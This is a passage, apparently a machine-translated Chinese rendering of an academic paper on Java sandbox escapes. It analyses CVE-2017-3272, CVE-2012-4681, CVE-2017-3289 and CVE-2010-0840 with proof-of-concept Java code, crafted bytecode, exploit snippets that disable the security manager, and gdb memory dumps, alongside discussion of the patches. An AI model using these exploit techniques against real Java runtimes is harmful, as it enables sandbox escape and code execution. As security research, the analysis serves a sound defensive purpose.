assert (pos &lt;= lim);361: int rem = (pos &lt;= lim ? lim - pos : 0);362: if (length &gt; rem)363: throw new BufferOverflowException();364:365:366: if (order() != ByteOrder.nativeOrder())367: Bits.copyFromIntArray(src,368: (long)offset &lt;&lt; 2,369: ix(pos),370: (long)length &lt;&lt; 2);371: else372:373: Bits.copyFromArray(src, arrayBaseOffset,374: (long)offset &lt;&lt; 2,375: ix(pos),376: (long)length &lt;&lt; 2);377: position(pos + length);378: &#125; else &#123;379: super.put(src, offset, length);380: &#125;381: return this;382:383:384:385: &#125; 此方法将src数组中的长度元素从指定的偏移量复制到内部数组。在第367行，调用方法Bits.copyFromIntArray（）。此Java方法将源数组的引用，源数组的偏移量（以字节为单位），以字节为单位的目标数组的索引以及要复制的字节数作为参数。由于最后三个参数表示大小和偏移量（以字节为单位），因此必须将它们乘以4（左侧移位2）。这是针对偏移（线374），pos（线375）和长度（线376）完成的。请注意，对于pos，操作在ix（）方法中完成。 在易受攻击的版本中，不存在强制转换，这使得代码容易受到整数溢出的影响。 类似地，将元素从内部数组复制到外部数组的get（）方法也很容易受到攻击。get（）方法与put（）方法非常相似，只是对copyFromIntArray（）的调用被对copyToIntArray（）的调用所取代： 12345678262: public IntBuffer get(int[] dst, int offset, int length) &#123;263:[...]275: Bits.copyToIntArray(ix(pos), dst,276: (long)offset &lt;&lt; 2,277: (long)length &lt;&lt; 2);[...]291: &#125; 由于方法get（）和put（）非常相似，因此下面我们仅描述如何在get（）方法中利用整数溢出。put（）方法的方法是相同的。 让我们看一下在get（）方法中调用的Bits.copyFromArray（）方法。这种方法实际上是一种原生方法： 12803: static native void copyToIntArray(long srcAddr, Object dst,804: long dstPos, long length); 该方法的C代码如下所示。 1234567891011121314151617181920212223242526272829303132333435175: JNIEXPORT void JNICALL176: Java_java_nio_Bits_copyToIntArray(JNIEnv *env, jobject this,177: jlong srcAddr, jobject dst, jlong dstPos, jlong length)178: &#123;179: jbyte *bytes;180: size_t size;181: jint *srcInt, *dstInt, *endInt;182: jint tmpInt;183:184: srcInt = (jint *)jlong_to_ptr(srcAddr);185:186: while (length &gt; 0) &#123;187: /* do not change this code, see WARNING above */188: if (length &gt; MBYTE)189: size = MBYTE;190: else191: size = (size_t)length;192:193: GETCRITICAL(bytes, env, dst);194:195: dstInt = (jint *)(bytes + dstPos);196: endInt = srcInt + (size / sizeof(jint));197: while (srcInt &lt; endInt) &#123;198: tmpInt = *srcInt++;199: *dstInt++ = SWAPINT(tmpInt);200: &#125;201:202: RELEASECRITICAL(bytes, env, dst, 0);203:204: length -= size;205: srcAddr += size;206: dstPos += size;207: &#125;208: &#125; 我们注意到没有检查数组索引。如果索引小于零或大于或等于数组大小，则代码也将运行。该代码首先将long转换为32位整数指针（第184行）。然后，代码循环直到长度/大小元素被复制（第186和204行）。对GETCRITICAL（）和RELEASECRITICAL（）（第193和202行）的调用用于同步对dst数组的访问，因此与检查数组的索引无关。 要执行此本机代码，必须满足get（）Java方法中存在的三个约束： 约束1：356: if (((long)length &lt;&lt; 2) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) { 约束2：357: checkBounds(offset, length, src.length); 约束3：362: if (length &gt; rem) 我们没有在第360行提及断言，因为只检查是否在VM中设置了“-ea”（启用断言）选项。这在生产中几乎从未出现过，因为它会导致减速。 在第一个约束中，JNI_COPY_FROM_ARRAY_THRESHOLD表示通过本机代码从中完成复制的阈值（要复制的元素数）。Oracle凭经验确定从6个元素调用本机代码是值得的。要满足此约束，要复制的元素数必须大于1（6 &gt;&gt; 2）。 第二个约束出现在checkBounds（）方法中： 1234564: static void checkBounds(int off, int len, int size) &#123;566: if ((off | len | (off + len) | (size - (off + len))) &lt; 0)567: throw new IndexOutOfBoundsException();568: &#125; 第二个约束可以表示如下： 121: offset &gt; 0 AND length &gt; 0 AND (offset + length) &gt; 02: AND (dst.length - (offset + length)) &gt; 0. 第三个约束检查剩余的元素数是否小于或等于要复制的元素数：length &lt; lim - pos 为简化起见，我们假设数组的当前索引为0.然后约束变为：length &lt; lim 这是一样的length &lt; dst.length 这些约束的解决方案是： 123dst.length = 1209098507offset = 1073741764length = 2 使用此解决方案，所有约束都得到满足，并且由于存在整数溢出，我们可以在负指数-240（1073741764 &lt;&lt; 2）处读取8个字节（2 * 4）。我们现在有一个read原语来读取dst数组之前的字节。在get（）方法上使用相同的技术，我们得到一个在dst数组之前写入字节的原语。 我们可以通过编写一个简单的PoC来检查我们的分析是否正确，并在易受攻击的JVM版本（例如Java 1.8 update 60）上执行它。 123456789101112131415161718192021222324 1: public class Test &#123; 2: 3: public static void main(String[] args) &#123; 4: int[] dst = new int[1209098507]; 5: 6: for (int i = 0; i &lt; dst.length; i++) &#123; 7: dst[i] = 0xAAAAAAAA; 8: &#125; 9:10: int bytes = 400;11: ByteBuffer bb = ByteBuffer.allocateDirect(bytes);12: IntBuffer ib = bb.asIntBuffer();13:14: for (int i = 0; i &lt; ib.limit(); i++) &#123;15: ib.put(i, 0xBBBBBBBB);16: &#125;17:18: int offset = 1073741764; // offset &lt;&lt; 2 = -24019: int length = 2;20:21: ib.get(dst, offset, length); // breakpoint here22: &#125;23:24: &#125; 此代码创建一个大小为1209098507（第4行）的数组，然后将此数组的所有元素初始化为0xAAAAAAAA（第6-8行）。然后，它创建一个IntBuffer类型的实例ib，并将其内部数组的所有元素（整数）初始化为0xBBBBBBBB（第10-16行）。最后，它调用get（）方法将2个元素从ib的内部数组复制到dst，负偏移为-240（第18-21行）。执行此代码不会导致VM崩溃。而且，我们注意到在调用get之后，没有修改dst数组的元素。这意味着来自ib内部数组的2个元素已被复制到dst之外。让我们通过在第21行设置断点然后在运行JVM的进程上启动gdb来检查这一点。在Java代码中，我们使用sun.misc.Unsafe来计算dst的地址，即0x20000000。 12345678910$ gdb -p 1234[...](gdb) x/10x 0x2000000000x200000000: 0x00000001 0x00000000 0x3f5c025e 0x4811610b0x200000010: 0xaaaaaaaa 0xaaaaaaaa 0xaaaaaaaa 0xaaaaaaaa0x200000020: 0xaaaaaaaa 0xaaaaaaaa(gdb) x/10x 0x200000000-2400x1ffffff10: 0x00000000 0x00000000 0x00000000 0x000000000x1ffffff20: 0x00000000 0x00000000 0x00000000 0x000000000x1ffffff30: 0x00000000 0x00000000 使用gdb，我们注意到dst数组的元素已按预期初始化为0xAAAAAAAA。数组不是直接从0xAAAAAAAA开始，而是有一个16字节的头，其中包含数组的大小（0x4811610b = 1209098507）。现在，在数组之前没有任何东西（只有空字节）240个字节。让我们执行get Java方法并使用gdb再次检查内存状态： 1234567891011(gdb) cContinuing.^CThread 1 &quot;java&quot; received signal SIGINT, Interrupt.0x00007fb208ac86cd in pthread_join (threadid=140402604672768, thread_return=0x7ffec40d4860) at pthread_join.c:9090 in pthread_join.c(gdb) x/10x 0x200000000-2400x1ffffff10: 0x00000000 0x00000000 0x00000000 0x000000000x1ffffff20: 0xbbbbbbbb 0xbbbbbbbb 0x00000000 0x000000000x1ffffff30: 0x00000000 0x00000000 从ib的内部数组到dst的两个元素的副本“工作”：它们在dst的第一个元素之前被复制了240个字节。由于某种原因，程序没有崩溃。查看进程的内存映射表明在0x20000000之前有一个内存区域，即rwx： 123456$ pmap 1234[...]00000001fc2c0000 62720K rwx-- [ anon ]0000000200000000 5062656K rwx-- [ anon ]0000000335000000 11714560K rwx-- [ anon ][...] 如下所述，在Java中，类型混淆是沙箱总旁路的同义词。漏洞CVE-2017-3272的想法是使用读写原语来执行类型混淆。我们的目标是在内存中具有以下结构： 123 B[] |0|1|............|k|......|l| A[] |0|1|2|....|i|................|m|int[] |0|..................|j|....|n| 类型为_B_的元素数组，位于IntBuffer对象的内部数组之前的_A_类型的元素数组之前。第一步是使用read原语复制内部整数数组（索引j）内_A_（索引为i）的元素的地址。第二步包括将引用从内部数组（在索引j处）复制到类型为_B_的元素（在索引k处）。完成这两个步骤后，JVM会认为索引k处的元素是_B_类型，但它实际上是_A_类型的元素。 处理堆的代码很复杂，可以从VM更改为VM（Hotspot，JRockit等），也可以从版本更改为版本。我们已经获得了一个稳定的情况，其中所有三个阵列彼此相邻，用于50个不同版本的JVM，具有以下数组大小： 123l = 429496729m = ln = 858993458 3.2.3 讨论 我们已经测试了Java 1.6,1.7和1.8的所有公开可用版本的漏洞。总共51个版本都是易受攻击的：18个版本的1.6（1.6_23到1.6_45），28个版本的1.7（1.7_0到1.7_80）和5个版本的1.8（1.8_05到1.8_60）。 我们已经讨论过上面的补丁：补丁代码现在首先在执行移位操作之前将32位整数转换为长整数。这有效地防止了整数溢出。 4 Java级漏洞4.1 混淆代理4.1.1 背景 混淆代理攻击是Java平台上非常常见的攻击类型。示例攻击是CVE-2012-5088，CVE-2012-5076，CVE-2013-2460以及CVE-2012-4681的攻击，我们将在下面详细介绍。基本思想是利用代码旨在访问私有方法或系统类的字段，以便例如停用安全管理器。但是，漏洞代码不是直接访问所需的类成员，而是代表受信任的系统类执行访问。为此目的滥用系统类的典型方法是利用反射或MethodHandles的不安全使用，即，可信系统类对目标字段执行可由分析员确定的反向读取访问。 4.1.2 示例：CVE-2012-4681 我们将看看CVE-2012-4681，因为这经常被其他作者称为混淆代理攻击的一个例子。 作为第一步，我们检索对sun.awt.SunToolkit的访问，这是一个受限制的类，不受信任的代码应该是不可访问的。 1231: Expression expr0 = new Expression(Class.class, "forName",2: new Object[] &#123;"sun.awt.SunToolkit"&#125;);3: Class sunToolkit = (Class)expr.execute().getValue(); 这已经利用了漏洞。即使我们将Class.forName（）指定为Expression的目标方法，实际上也不会调用此方法。相反，Expression专门为这种情况实现自定义逻辑，它在没有正确检查访问权限的情况下加载类。因此，Expression在这里作为我们混淆代理，为我们加载一个我们不允许加载的类。 下一步，我们使用SunToolkit.getField（）来访问私有字段Statement.acc。 1231: Expression expr1 = new Expression(sunToolkit, "getField",2: new Object[] &#123;Statement.class, "acc"&#125;);3: Field acc = expr1.execute().getValue(); getField（）是另一个混淆代理，我代表他们获得对系统类的私有字段的反射访问。以下代码段显示getField（）使用doPrivileged（）来获取请求的字段，并将其设置为可访问，以便稍后可以修改其值。 1234567891011 1: public static Field getField(final Class klass, 2: final String fieldName) &#123; 3: return AccessController.doPrivileged( 4: new PrivilgedAction&lt;Field&gt;() &#123; 5: public Field run() &#123; 6: ... 7: Field field = klass.getDeclaredField(fieldName); 8: ... 9: field.setAccessible(true);10: return field;11: ... 接下来，我们创建一个AccessControlContext，它被分配了所有权限。 1234561: Permissions permissions = new Permissions();2: permissions.add(new AllPermission());3: ProtectionDomain pd = new ProtectionDomain(new CodeSource(4: new URL("file:///"), new Certificate[0]), permissions);5: AccessControlContext newAcc =6: AccessControlContext(new ProtectionDomain[] &#123;pd&#125;); Statement对象可以表示任意方法调用。创建Statement实例时，它会将当前安全上下文存储在Statement.acc中。调用Statement.execute（）时，它将执行它在最初存储在Statement.acc中的安全上下文中表示的调用，以确保它使用与直接调用它相同的权限调用该方法。 接下来，我们创建一个表示调用System.setSecurityManager（null）的Statement，并使用具有所有权限的新AccessControlContext覆盖存储在Statement.acc中的AccessControlContext。 1231: Statement stmt = new Statement(System.class, "setSecurityManager",2: new Object[1]);3: acc.set(stmt, newAcc) 最后，我们调用stmt.execute（）来实际执行对setSecurityManager（）的调用。此调用将成功，因为我们已将stmt.acc中的安全上下文替换为已分配了所有权限的安全上下文。 4.1.3 讨论 混乱的代理攻击问题自然源于Java平台安全的核心概念。沙箱的一个关键机制是基于堆栈的访问控制，其在尝试敏感操作时检查调用堆栈，从而检测例如从不可信代码到敏感类成员的直接访问。但是，在许多情况下，此堆栈检查会在检查当前堆栈上的所有调用方是否具有适当权限之前终止。发生这种情况时有两种常见情况。在第一种情况下，堆栈上的一个调用者调用doPrivileged（）来显式声明所需的操作被认为是安全的，即使从非特权代码调用也是如此。而doPrivileged（）通常是一种明智的机制，在未采取所有预防措施以确保特定操作安全的情况下，它也可能被错误地使用。在第二种情况下，系统类中的方法将仅手动检查直接调用方的属性，并跳过JVM的访问控制机制，该机制还将检查堆栈上的其他调用方。在这两种情况下，分析人员只需代表系统类执行某些敏感操作，就可以从不完整的堆栈遍历中获益。 4.2 未初始化的实例4.2.1 背景 Java对象初始化中的关键步骤是调用相应类型的构造函数。构造函数包含变量初始化的必要代码，但也可能包含安全性检查。因此，对于平台的安全性和稳定性来说，强制在对象初始化完成之前实际调用构造函数并且其他代码调用该类型的方法是很重要的。 执行构造函数调用由字节码验证器负责，它在加载期间检查所有类以确保其有效性。这还包括，例如，检查跳转是否落在有效指令上而不是在指令的中间，并检查控制流是否以返回指令结束。此外，它还检查指令是否对有效类型进行操作，这是防止类型混淆攻击所必需的，我们在第3.1.1节中介绍了这些类型。 从历史上看，为了检查类型有效性，JVM依靠数据流分析来计算修复点。该分析可能需要在相同路径上执行多次传递。由于这是耗时的，并且可能使类加载过程变慢，因此已经开发了一种新方法来在线性时间中执行类型检查，其中每个路径仅被检查一次。为此，沿字节码添加了称为堆栈映射帧的元信息。简而言之，堆栈映射框描述了每个分支目标的可能类型。堆栈映射帧存储在称为堆栈映射表的结构中。 当分析人员能够创建一个实例，在该实例上不执行对（*）的调用，对象的构造函数或超类的构造函数的操作时，会出现未初始化的实例漏洞。此漏洞直接违反了虚拟机的规范。对JVM安全性的影响是，对于未初始化的实例漏洞，分析人员可以实例化他不应该访问的对象，并且可以访问他不应该访问的属性和方法。这可能会导致沙箱逃逸。 4.2.2 示例：CVE-2017-3289 CVE的描述表明“此漏洞的成功攻击可能导致Java SE，Java SE Embedded的接管”。至于CVE-2017-3272，这意味着可能利用漏洞逃脱Java沙箱。 Redhat的bugzilla表示“在OpenJDK的Hotspot组件中发现了与不正确的异常堆栈帧处理有关的不安全的类构造缺陷。不受信任的Java应用程序或applet可能会利用这个漏洞绕过Java沙箱限制。”。这告诉分析师：（1）漏洞在于C / C ++代码（Hotspot是Java VM的名称），以及（2）漏洞与非法类构造和异常堆栈帧有关。信息（2）表示该漏洞可能在C / C ++代码中检查字节码的有效性。该页面还链接到此漏洞的OpenJDK补丁。 OpenJDK的修补程序“8167104：修复漏洞的其他类构建改进”可在线获取。修补了五个C ++文件：“classfile / verifier.cpp”，负责验证类文件结构和有效性的类，“classfile / stackMapTable。{cpp，hpp}”，处理堆栈映射表的文件，以及“classfile / stackMapFrame。{cpp，hpp}”，表示堆栈映射帧的文件。 通过查看diff，我们发现已经删除了函数StackMapFrame :: has_flag_match_exception（），并且通过删除对has_flag_match_exception（）的调用来更新我们将称为C1的条件。此外，方法match_stackmap（）和is_assignable_to（）现在只有一个参数：“bool handler”已被删除。如果验证程序当前正在检查异常处理程序，则此参数“handler”设置为“true”。条件C1如下所示： 12345678....- bool match_flags = (_flags | target-&gt;flags()) == target-&gt;flags();- if (match_flags || is_exception_handler &amp;&amp; has_flag_match_exception(target)) &#123;+ if ((_flags | target-&gt;flags()) == target-&gt;flags()) &#123; return true; &#125;.... 这个条件在函数is_assignable_to（）中，它检查当前堆栈映射帧是否可分配给目标堆栈映射帧，作为参数传递给函数。在补丁之前，返回“true”的条件是“match_flags || is_exception_handler &amp;&amp; has_flag_match_exception（target）”。在英语中，这意味着当前堆栈映射帧和目标堆栈映射帧的标志相同或者当前指令在异常处理程序中，并且函数“has_flag_match_exception”返回“true”。注意，只有一种标志叫做“UNINITIALIZED_THIS”（又名FLAG_THIS_UNINIT）。如果此标志为true，则表示“this”引用的对象未初始化，即尚未调用其构造函数。 在补丁之后，条件变为“match_flags”。这意味着，在易受攻击的版本中，可能有一种方法来构造“match_flags”为假的字节码（即“this”在当前帧中具有未初始化的标志但在目标帧中没有，但是“ is_exception_handler“是”true“（当前指令在异常处理程序中）并且”has_flag_match_exception（target）“返回”true“。但是这个函数何时返回“true”？ 函数has_flag_match_exception（）在以下列表中表示。 123456789101112131415161718192021222324252627282930 1: .... 2: bool StackMapFrame::has_flag_match_exception( 3: const StackMapFrame* target) const &#123; 4: 5: assert(max_locals() == target-&gt;max_locals() &amp;&amp; 6: stack_size() == target-&gt;stack_size(), 7: "StackMap sizes must match"); 8: 9: VerificationType top = VerificationType::top_type();10: VerificationType this_type = verifier()-&gt;current_type();11:12: if (!flag_this_uninit() || target-&gt;flags() != 0) &#123;13: return false;14: &#125;15:16: for (int i = 0; i &lt; target-&gt;locals_size(); ++i) &#123;17: if (locals()[i] == this_type &amp;&amp; target-&gt;locals()[i] != top) &#123;18: return false;19: &#125;20: &#125;21:22: for (int i = 0; i &lt; target-&gt;stack_size(); ++i) &#123;23: if (stack()[i] == this_type &amp;&amp; target-&gt;stack()[i] != top) &#123;24: return false;25: &#125;26: &#125;27:28: return true;29: &#125;30: .... 为了使此函数返回“true”，必须通过以下所有条件：（1）当前帧和目标帧的最大局部变量数和堆栈的最大大小必须相同（第5-7行））; （2）当前帧必须将“UNINIT”标志设置为“true”（第12-14行）; （3）目标框架中没有使用未初始化的对象（第16-26行）。 以下清单说明了满足以下三个条件的字节码： 1234567891011121314151617181920&lt;init&gt;()0: new // class java/lang/Throwable1: dup2: invokespecial // Method java/lang/Throwable.&quot;&lt;init&gt;&quot;:()V3: athrow4: new // class java/lang/RuntimeException5: dup6: invokespecial // Method java/lang/RuntimeException.&quot;&lt;init&gt;&quot;:()V7: athrow8: returnException table: from to target type 0 4 8 Class java/lang/Throwable StackMapTable: number_of_entries = 2 frame at instruction 3 local = [UNINITIALIZED_THIS] stack = [ class java/lang/Throwable ] frame at instruction 8 locals = [TOP] stack = [ class java/lang/Throwable ] 最大本地数和最大堆栈大小可以设置为2以满足第一个条件。当前帧在第3行将“UNINITIALIZED_THIS”设置为true以满足第二个条件。最后，为了满足第三个条件，未初始化的局部因素不用于“athrow”指令的目标（第8行），因为本地的第一个元素被初始化为“TOP”。 请注意，代码位于try / catch块中，以便在函数is_assignable_to（）中将“is_exception_handler”设置为“true”。此外，请注意字节码在构造函数中（字节码中的（））。这是必须的，以便将标志“UNINITIALIZED_THIS”设置为true。 我们现在知道分析师能够制作返回其自身未初始化对象的字节码。乍一看，可能很难看出分析师如何使用这样的对象。但是，仔细观察可以看出，这样一个被操作的类可以实现为系统类的子类，可以在不调用超类的构造函数super。（）的情况下进行初始化。这可用于实例化公共系统类，否则这些类不能由不受信任的代码实例化，因为它们的构造函数是私有的，或包含权限检查。下一步是找到为分析师提供“有趣”功能的类。目的是将所有功能组合在一起，以便能够在沙箱环境中执行任意代码，从而绕过沙箱。然而，找到有用的类本身就是一项复杂的任务。具体而言，我们面临着以下挑战。 挑战1：在哪里寻找帮助代码JRE附带了许多包含JCL（Java类库）类的jar文件。这些类作为trusted classes加载，并且可以在构造漏洞利用时使用。不幸的是对于分析师来说，但幸运的是，对于Java用户来说，越来越多的类被标记为“受限制”，这意味着untrusted代码无法直接实例化它们。限制包的数量从1.6.0_01中的一个变为1.8.0_121中的47。这意味着分析师在构建漏洞利用时无法直接使用的代码百分比从1.6.0_01中的20％变为1.8.0_121中的54％。 挑战2：字段可能未初始化如果没有适当的权限，通常无法实例化新的类加载器。在构造函数中检查ClassLoader类的权限，初看起来似乎是一个有趣的目标。由于CVE-2017-3289的漏洞，确实可以在没有权限的情况下实例化新的类加载器，因为构造函数代码 - 以及权限检查 - 将不会被执行。但是，由于绕过了构造函数，因此使用默认值初始化字段（例如，对于整数为零，对于引用为null）。这是有问题的，因为通常允许定义具有所有特权的新类的有趣方法将失败，因为代码将尝试取消引用尚未正确初始化的字段。在手动检查之后，似乎很难绕过字段解除引用，因为所有路径都通过取消引用非初始化字段的指令。利用ClassLoader似乎是一个死胡同。当使用CVE-2017-3289的漏洞时，非初始化字段是一个主要挑战：除了要求目标类是公共的，非最终的和非限制的，其感兴趣的方法也不应该执行方法取消引用未初始化的字段。 我们还没有找到Java版本1.8.0更新112的有用帮助代码。为了说明CVE-2017-3289的漏洞如何工作，我们将展示利用0422和0431的漏洞的替代帮助代码。这两个漏洞依赖于MBeanInstantiator，一个类定义了可以加载任意类的方法findClass（）。类MBeanInstantiator只有私有构造函数，因此无法进行直接实例化。最初，这些漏洞使用JmxMBeanServer来创建MBeanInstantiator的实例。我们将展示分析师可以直接子类化MBeanInstantiator并使用漏洞3289来获取它的实例。 用于实例化MBeanInstantiator的原始帮助程序代码依赖于JmxMBeanServer，如下所示： 12341: JmxMBeanServerBuilder serverBuilder = new JmxMBeanServerBuilder();2: JmxMBeanServer server =3: (JmxMBeanServer) serverBuilder.newMBeanServer("", null, null);4: MBeanInstantiator instantiator = server.getMBeanInstantiator(); 实例化MBeanInstantiator的替代代码利用了CVE-2017-3289的漏洞： 1234567891: public class PoCMBeanInstantiator extends java.lang.Object &#123;2: public PoCMBeanInstantiator(ModifiableClassLoaderRepository clr) &#123;3: throw new RuntimeException();4: &#125;5:6: public static Object get() &#123;7: return new PoCMBeanInstantiator(null);8: &#125;9: &#125; 请注意，由于MBeanInstantiator没有任何公共构造函数，PoCMBeanInstantiator必须在源代码中扩展一个虚拟类，在我们的示例中为java.lang.Object。我们使用ASM字节码操作库，将PoCMBeanInstantiator的超类更改为MBeanInstantiator。我们还使用ASM来更改构造函数的字节码以绕过对super。（*）的调用。 自Java 1.7.0更新13以来，Oracle已将com.sun.jmx.添加为受限程序包。类MBeanInstantiator在此包中，因此无法在更高版本的Java中重用此帮助程序代码。 令我们惊讶的是，此漏洞影响了40多个不同的公开发布。从更新0到更新80的所有Java 7版本都会受到影响。从更新5到更新112的所有Java 8版本也会受到影响。Java 6不受影响。 通过查看Java 6更新43的字节码验证器和Java 7更新0的源代码之间的差异，我们注意到diff的主要部分对应于上面提供的补丁的逆。这意味着在构造函数中异常处理程序中堆栈帧可分配给目标堆栈帧的条件已被削弱。diff中的注释表明这个新代码已经通过请求7020118添加。此请求要求更新字节码验证程序的代码，以便NetBeans的分析器可以生成处理程序以覆盖构造函数的整个代码。 通过收紧约束来修复漏洞，在该约束下，当前堆栈帧（在try / catch块中的构造函数中）可以分配给目标堆栈帧。这有效地防止字节码从构造函数返回未初始化的“this”对象。 据我们所知，Java至少有三个公开的uninitialized instance漏洞。一个是本文中描述的CVE-2017-3289。第二个是在2002年发现的。作者还利用了字节码验证器中的漏洞，该漏洞使得不能调用超类的构造函数。他们无法开发漏洞来完全逃离沙箱。但是，他们能够访问网络并将文件读写到磁盘。第三个是1996年普林斯顿的一个研究小组发现的。同样，问题出在字节码验证器中。它允许构造函数捕获对super（）的调用抛出的异常并返回部分初始化的对象。请注意，在此次攻击时，类加载器类没有任何实例变量。因此，利用漏洞来实例化类加载器给出了一个完全初始化的类加载器，可以在其上调用任何方法。 4.2.3 讨论 此漏洞的根本原因是对C / C ++字节码验证代码的修改，该代码使分析人员能够创建Java字节码，该字节码无法绕过对子类构造函数中的super（）的调用。此漏洞直接违反了虚拟机的规范。 但是，如果没有适当的helper代码，此漏洞将毫无用处。Oracle开发了静态分析工具来查找危险的小工具并将其列入黑名单。这使得分析师更难以绕过沙箱开发漏洞利用程序。实际上，我们只发现了与旧版JVM一起使用的有趣小工具。由于它们已被列入最新版本的黑名单，因此攻击不再起作用。然而，即使该方法依赖于静态分析，它（1）可能会产生许多误报，这使得识别真正危险的小工具变得更加困难，并且（2）可能具有错误的否定因为它不能真实地模拟语言的所有特定性，通常反射和JNI，因此不健全。 4.3 可信方法链4.3.1 背景 每当在Java中执行安全检查时，都会检查整个调用堆栈。调用堆栈的每个帧都包含由其类和方法签名标识的方法名称。可信方法链攻击的想法是在调用堆栈上只有受信任的类。为实现此目的，分析人员通常依赖于受信任类中存在的反射功能来调用目标方法。这样，当安全检查完成并且目标方法将在特权上下文中执行时（通常禁用安全管理器），调用堆栈上不会有应用程序类（不可信）。为了使这种方法起作用，方法链必须位于特权线程上，例如事件线程。它不能在主线程上工作，因为具有main方法的类被认为是不可信的，因此安全检查将引发异常。 4.3.2 示例：CVE-2010-0840 此漏洞是针对Java平台的可信方法链攻击的第一个示例。它依赖于java.beans.Statement类来通过反射执行目标方法。该漏洞利用了一个JList GUI元素（“一个显示对象列表并允许用户选择一个或多个项目的组件。”）强制GUI线程绘制新元素。漏洞利用代码如下： 12345678910111213141516// target method Object target = System.class; String methodName = "setSecurityManager"; Object[] args = new Object[] &#123; null &#125;; Link l = new Link(target, methodName, args); final HashSet s = new HashSet(); s.add(l); Map h = new HashMap() &#123; public Set entrySet() &#123; return s; &#125;; &#125;; sList = new JList(new Object[] &#123; h &#125;); 目标方法通过Link对象表示为Statement。Link类不是来自JCL的类，而是由分析师构造的类。Link类是Expression的子类，它是Statement的子类。Link对象也以伪方式实现java.util.Map.Entry接口的getValue（）方法。它不是Entry接口的真正实现，因为只存在getValue（）方法。这种“实现”不能用普通的javac编译器完成，必须通过直接修改Link类的字节码来完成。 123456789101112131415interface Entry&lt;K,V&gt; &#123; [...] /** * Returns the value corresponding to this entry. If the mapping * has been removed from the backing map (by the iterator's * &lt;tt&gt;remove&lt;/tt&gt; operation), the results of this call are * undefined. * * @return the value corresponding to this entry * @throws IllegalStateException implementations may, but are not * required to, throw this exception if the entry has been * removed from the backing map. */ V getValue(); [...] 该接口具有getValue（）方法。事实证明Expression类也有一个具有相同签名的getValue（）方法。这就是为什么在运行时在Link类型的对象上调用Entry.getValue（），伪造Entry的实现，可以成功。 1234567891011121314151617181920// in AbstractMappublic String toString() &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); if (! i.hasNext()) return "&#123;&#125;"; StringBuilder sb = new StringBuilder(); sb.append('&#123;'); for (;;) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); sb.append(key == this ? "(this Map)" : key); sb.append('='); sb.append(value == this ? "(this Map)" : value); if (! i.hasNext()) return sb.append('&#125;').toString(); sb.append(',').append(' '); &#125;&#125; 分析师的目的是调用AbstractMap.toString（）方法来调用Link对象上的Entry.getValue（），该对象调用invoke（）方法： 123456public Object getValue() throws Exception &#123; if (value == unbound) &#123; setValue(invoke()); &#125; return value;&#125; invoke方法通过反射执行分析师的目标方法System.setSecurityManapger（null）以禁用安全管理器。通过反射调用此方法时的调用堆栈如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748at java.beans.Statement.invoke(Statement.java:235)at java.beans.Expression.getValue(Expression.java:98)at java.util.AbstractMap.toString(AbstractMap.java:487)at javax.swing.DefaultListCellRenderer.getListCellRendererComponent (DefaultListCellRenderer.java:125)at javax.swing.plaf.basic.BasicListUI.updateLayoutState (BasicListUI.java:1337)at javax.swing.plaf.basic.BasicListUI.maybeUpdateLayoutState (BasicListUI.java:1287)at javax.swing.plaf.basic.BasicListUI.paintImpl(BasicListUI.java:251)at javax.swing.plaf.basic.BasicListUI.paint(BasicListUI.java:227)at javax.swing.plaf.ComponentUI.update(ComponentUI.java:143)at javax.swing.JComponent.paintComponent(JComponent.java:758)at javax.swing.JComponent.paint(JComponent.java:1022)at javax.swing.JComponent.paintChildren(JComponent.java:859)at javax.swing.JComponent.paint(JComponent.java:1031)at javax.swing.JComponent.paintChildren(JComponent.java:859)at javax.swing.JComponent.paint(JComponent.java:1031)at javax.swing.JLayeredPane.paint(JLayeredPane.java:564)at javax.swing.JComponent.paintChildren(JComponent.java:859)at javax.swing.JComponent.paint(JComponent.java:1031)at javax.swing.JComponent.paintToOffscreen(JComponent.java:5104)at javax.swing.BufferStrategyPaintManager.paint (BufferStrategyPaintManager.java:285)at javax.swing.RepaintManager.paint(RepaintManager.java:1128)at javax.swing.JComponent._paintImmediately(JComponent.java:5052)at javax.swing.JComponent.paintImmediately(JComponent.java:4862)at javax.swing.RepaintManager.paintDirtyRegions (RepaintManager.java:723)at javax.swing.RepaintManager.paintDirtyRegions (RepaintManager.java:679)at javax.swing.RepaintManager.seqPaintDirtyRegions (RepaintManager.java:659)at javax.swing.SystemEventQueueUtilities$ComponentWorkRequest.run (SystemEventQueueUtilities.java:128)at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:209)at java.awt.EventQueue.dispatchEvent(EventQueue.java:597)at java.awt.EventDispatchThread.pumpOneEventForFilters (EventDispatchThread.java:273)at java.awt.EventDispatchThread.pumpEventsForFilter (EventDispatchThread.java:183)at java.awt.EventDispatchThread.pumpEventsForHierarchy (EventDispatchThread.java:173)at java.awt.EventDispatchThread.pumpEvents (EventDispatchThread.java:168)at java.awt.EventDispatchThread.pumpEvents (EventDispatchThread.java:160)at java.awt.EventDispatchThread.run(EventDispatchThread.java:121) 第一个观察是调用堆栈上没有不受信任的类。对调用堆栈的元素执行的任何安全检查都将通过。 如上面的调用堆栈所示，绘制操作（RepaintManager.java:1128）最终调用getListCellRendererComponent（）方法（DefaultListCellRenderer.java:125）。JList构造函数将item元素的列表作为参数。此方法依次调用项目上的toString（）方法。第一个元素是Map，在其所有项目上调用getValue（）。getValue（）方法调用Statement.invoke（），它通过反射调用分析师的目标方法。 4.3.3 讨论 通过修改Statement.invoke（）方法来修补此漏洞，以在创建Statement的代码的AccessControlContext中执行反射调用。此漏洞不适用于最新版本的JRE，因为创建Statement的不受信任的代码没有任何权限。 4.4 序列化4.4.1 背景 